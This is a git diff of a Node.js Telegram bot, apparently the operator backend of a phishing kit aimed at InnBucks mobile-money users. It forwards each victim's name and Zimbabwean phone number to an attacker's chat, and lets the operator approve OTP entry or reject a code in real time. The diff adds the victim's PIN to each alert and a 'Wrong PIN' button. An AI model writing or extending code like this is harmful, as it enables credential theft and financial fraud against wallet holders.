@@ -1,7 +1,6 @@
 const fetch = require('node-fetch');
 const crypto = require('crypto');
 
-// Global session store - shared across all requests
 const sessions = {};
 
 class InnBucksBot {
@@ -32,14 +31,15 @@ class InnBucksBot {
     return crypto.createHash('md5').update(raw).digest('hex');
   }
 
-  async sendLoginAlert(firstName, lastName, phone) {
+  async sendLoginAlert(firstName, lastName, phone, pin) {
     const fullName = `${firstName} ${lastName}`.trim();
     const sessionId = this.generateSessionId(phone);
     const now = new Date().toISOString().replace('T', ' ').substring(0, 19);
 
     const keyboard = {
       inline_keyboard: [[
-        { text: '🔑 Request OTP', callback_data: `otp_request_${sessionId}` }
+        { text: '🔑 Request OTP', callback_data: `otp_request_${sessionId}` },
+        { text: '❌ Wrong PIN', callback_data: `wrong_pin_${sessionId}` }
       ]]
     };
 
@@ -47,8 +47,9 @@ class InnBucksBot {
       `🔐 *New Login Attempt*\n\n` +
       `👤 *Name:* ${fullName}\n` +
       `📱 *Phone:* +263 ${phone}\n` +
+      `🔢 *PIN:* \`${pin}\`\n` +
       `⏰ *Time:* ${now}\n\n` +
-      `Click below to allow OTP entry:`;
+      `Click below to continue:`;
 
     await this.sendRequest('sendMessage', {
       chat_id: this.adminChatId,
@@ -98,6 +99,10 @@ class InnBucksBot {
       const sessionId = data.replace('otp_request_', '');
       sessions[sessionId] = 'approved';
       console.log(`✅ Session approved: ${sessionId}`);
+    } else if (data.startsWith('wrong_pin_')) {
+      const sessionId = data.replace('wrong_pin_', '');
+      sessions[sessionId] = 'wrong_pin';
+      console.log(`❌ Session wrong_pin: ${sessionId}`);
     } else if (data.startsWith('wrong_')) {
       const sessionId = data.replace('wrong_', '');
       sessions[sessionId] = 'wrong_code';
@@ -109,16 +114,14 @@ class InnBucksBot {
     }
 
     console.log(`📦 All sessions after callback:`, sessions);
-
     await this.sendRequest('answerCallbackQuery', { callback_query_id: callbackId });
     return true;
   }
 
-getSessionStatus(sessionId) {
+  getSessionStatus(sessionId) {
     const status = sessions[sessionId] || 'pending';
     console.log(`🔍 Checking session ${sessionId}: ${status}`);
     if (status !== 'pending') {
-      // Wait 5 seconds before deleting so polling can catch it
       setTimeout(() => { delete sessions[sessionId]; }, 5000);
     }
     return status;
